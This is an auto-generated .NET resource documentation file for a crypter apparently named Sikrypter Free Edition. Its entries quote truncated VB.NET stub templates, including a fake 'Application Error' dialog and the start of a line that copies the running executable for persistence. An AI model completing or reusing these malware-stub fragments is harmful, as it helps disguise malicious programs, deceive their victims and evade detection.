﻿<?xml version="1.0"?>
<doc>
<assembly>
<name>
SikrypterFreeEdition
</name>
</assembly>
<members>
<member name="P:Sikrypter_Free_Edition.My.Resources.Resources.ResourceManager">
	<summary>
  Returns the cached ResourceManager instance used by this class.
</summary>
</member><member name="P:Sikrypter_Free_Edition.My.Resources.Resources.Culture">
	<summary>
  Overrides the current thread's CurrentUICulture property for all
  resource lookups using this strongly typed resource class.
</summary>
</member><member name="P:Sikrypter_Free_Edition.My.Resources.Resources.EAX">
	<summary>
  Looks up a localized string similar to Imports System
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.VisualBasic
Imports System.Windows.Forms
Imports System.Diagnostics
Imports System.Reflection
Namespace A
Public Class A
	Public Shared Sub AA()
		'_ERRORMSGMessageBox.Show("The application failed to initialize properly (0xc000007b). Click on OK to terminate the application.", "Application Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
		Try
			'_STARTUPIO.File.Copy(Application.ExecutablePath, Enviro [rest of string was truncated]";.
</summary>
</member><member name="P:Sikrypter_Free_Edition.My.Resources.Resources.EBX">
	<summary>
  Looks up a localized string similar to Option Explicit Off
Option Strict Off
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System
Imports Microsoft.VisualBasic
Imports System.Text
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Windows.Forms
Imports System.IO
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.Diagnostics
&lt;Assembly: AssemblyVersion("2.0.1.2")&gt; 
&lt;Assembly: AssemblyProduct("2.0.1.2")&gt; 
&lt;Assembly: AssemblyKeyFileAttribute("STRONGNAMELOCATIO [rest of string was truncated]";.
</summary>
</member><member name="P:Sikrypter_Free_Edition.My.Resources.Resources.Locked">
	<summary>
  Looks up a localized string similar to Option Explicit Off
Option Strict Off
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System
Imports Microsoft.VisualBasic
Imports System.Text
Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Windows.Forms
Imports System.IO
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.Diagnostics
&lt;Assembly: AssemblyVersion("2.0.1.2")&gt; 
&lt;Assembly: AssemblyProduct("2.0.1.2")&gt; 
&lt;Assembly: AssemblyKeyFileAttribute("STRONGNAMELOCATIO [rest of string was truncated]";.
</summary>
</member><member name="T:Sikrypter_Free_Edition.My.Resources.Resources">
	<summary>
  A strongly-typed resource class, for looking up localized strings, etc.
</summary>
</member>
</members>
</doc>